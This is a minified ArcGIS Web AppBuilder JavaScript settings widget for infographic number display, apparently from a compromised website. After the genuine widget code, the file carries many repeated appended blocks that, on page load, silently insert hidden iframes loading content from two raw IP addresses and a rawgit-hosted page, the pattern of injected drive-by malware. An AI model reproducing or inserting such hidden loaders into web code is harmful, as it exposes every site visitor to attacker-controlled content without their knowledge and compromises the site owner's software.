// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Infographic/setting/dijitsSetting/NumberDijitSetting.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"settingTitle" class\x3d"settingTitle"\x3e${nls.numberSettings}\x3c/div\x3e\r\n  \x3cdiv class\x3d"infohraphic-setting-tab-container" style\x3d"width:100%;"\x3e\r\n    \x3cdiv style\x3d"margin-top: 20px;" data-dojo-attach-point\x3d"tabNode" class\x3d"tabHeader"\x3e\x3c/div\x3e\r\n\r\n    \x3cdiv style\x3d"margin-top: 10px;" data-dojo-attach-point\x3d"numberStatistics"\x3e\x3c/div\x3e\r\n\r\n    \x3cdiv style\x3d"margin-top: 10px;" class\x3d"number-setting-display paddingRight10" data-dojo-attach-point\x3d"display"\x3e\r\n      \x3cdiv class\x3d"section"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"dataFormatSettingNode"\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"section"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"fontSettingNode"\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"section"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"backgroundSettingNode"\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv style\x3d"margin-top: 20px;" class\x3d"indicatorsTitlePane paddingRight10" data-dojo-attach-point\x3d"indicatorsDiv"\x3e\x3c/div\x3e\r\n\r\n  \x3c/div\x3e\r\n\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin dojo/text!./NumberDijitSetting.html ./BaseDijitSetting dijit/_TemplatedMixin ./_dijits/MultipleIndicators ./_dijits/SingleNumberStatistics ./_dijits/BackgroundSetting ./_dijits/FontSetting ./_dijits/DataFormatSetting dojo/_base/lang dojo/on jimu/dijit/TabContainer3 dijit/TitlePane".split(" "),function(d,e,f,g,h,k,l,m,n,p,a,b,q){return d([g,e,h],{templateString:f,baseClass:"infographic-number-dijit-setting",type:"number",postMixInProperties:function(){a.mixin(this.nls,
window.jimuNls.common)},postCreate:function(){this.inherited(arguments);this._initUI();this.setConfig(this.config);this._hasLoaded=!0},getConfig:function(){this.config||(this.config={});var c=this.indicators.getConfig();this.config.indicators=c;return this.backgroundSetting.isValid()&&this.fontSetting.isValid()&&this.dataFormatSetting.isValid()&&this.singleNumberStatistics.isValid()?(this.backgroundSetting&&(this.config.background=this.backgroundSetting.getConfig()),this.fontSetting&&(this.config.font=
this.fontSetting.getConfig()),this.dataFormatSetting&&(this.config.dataFormat=this.dataFormatSetting.getConfig()),this.singleNumberStatistics&&(this.config.statistic=this.singleNumberStatistics.getConfig()),this.config):!1},setConfig:function(c){if(this.config=c)this.indicators.setConfig(this.config),this.singleNumberStatistics.setConfig(this.config.statistic)},updateDijit:function(){this.dijit.setConfig(this.config)},_initUI:function(){this._initTabs();this._initIndicators();this._initSingNumberStatistics();
this._initDisplay()},_initTabs:function(){this.tab=new q({average:!0,tabs:[{title:this.nls.data,content:this.numberStatistics},{title:this.nls.display,content:this.display},{title:this.nls.indicators,content:this.indicatorsDiv}]},this.tabNode)},_initDisplay:function(){this.backgroundSetting=new m({config:this.config.background,nls:this.nls});this.backgroundSetting.placeAt(this.backgroundSettingNode);this.backgroundSetting.startup();this.own(b(this.backgroundSetting,"change",a.hitch(this,function(){this._onSettingsChange()})));
this.fontSetting=new n({config:this.config.font,nls:this.nls});this.fontSetting.placeAt(this.fontSettingNode);this.fontSetting.startup();this.own(b(this.fontSetting,"change",a.hitch(this,function(){this._onSettingsChange()})));this.dataFormatSetting=new p({config:this.config.dataFormat,nls:this.nls});this.dataFormatSetting.placeAt(this.dataFormatSettingNode);this.dataFormatSetting.startup();this.own(b(this.dataFormatSetting,"change",a.hitch(this,function(){this._onSettingsChange()})))},_initSingNumberStatistics:function(){this.singleNumberStatistics=
new l({config:this.config.statistic,dataSource:this.dataSource,nls:this.nls});this.singleNumberStatistics.placeAt(this.numberStatistics);this.singleNumberStatistics.startup();this.own(b(this.singleNumberStatistics,"change",a.hitch(this,function(c){var a=this.dataFormatSetting.getConfig(),b=a.decimalPlaces;if(c&&"Features"===c.type){if("number"!==typeof b||2===b)a.decimalPlaces=0,this.dataFormatSetting.setConfig(a)}else!c||"FeatureStatistics"!==c.type||"number"===typeof b&&0!==b||(a.decimalPlaces=
2,this.dataFormatSetting.setConfig(a));this._onSettingsChange()})))},_initIndicators:function(){this.indicators=new k({nls:this.nls,type:"number",folderUrl:this.folderUrl});this.indicators.placeAt(this.indicatorsDiv);this.indicators.startup();this.own(b(this.indicators,"change",a.hitch(this,function(){this._onSettingsChange()})))},_onSettingsChange:function(){this._hasLoaded&&(this.getConfig(),this.updateDijit())},setDataSource:function(a){this.inherited(arguments);this.singleNumberStatistics&&this.singleNumberStatistics.setDataSource(a)},
destroy:function(){this.indicators&&(this.indicators.destroy(),this.indicators=null);this.singleNumberStatistics&&(this.singleNumberStatistics.destroy(),this.singleNumberStatistics=null);this.inherited(arguments)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});